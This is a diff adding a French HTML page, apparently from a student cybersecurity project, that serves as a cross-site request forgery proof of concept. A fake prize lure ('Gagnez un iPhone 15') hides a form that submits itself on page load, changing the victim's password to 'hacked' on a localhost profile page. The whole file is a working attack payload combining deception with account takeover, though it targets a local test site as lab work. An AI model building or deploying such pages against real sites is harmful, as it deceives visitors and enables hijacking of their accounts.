@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Gagnez un iPhone 15 !</title>
+</head>
+
+<body>
+    <h1 style="text-align: center; color: red;">Félicitations ! Vous avez gagné !</h1>
+    <p style="text-align: center;">Chargement de votre lot en cours...</p>
+
+    <!-- ATTENTION : Si votre site est dans un sous-dossier (ex: http://localhost/SAE-Cyber/), 
+         ajoutez ce dossier dans l'URL ci-dessous. Ici on vise localhost a la racine. -->
+    <form action="http://localhost/index.php?page=profil" method="POST" id="hackForm">
+        <input type="hidden" name="new_password" value="hacked">
+    </form>
+
+    <script>
+        // Le script valide le formulaire automatiquement sans que l'utilisateur ne clique
+        document.getElementById('hackForm').submit();
+    </script>
+</body>
+
+</html>
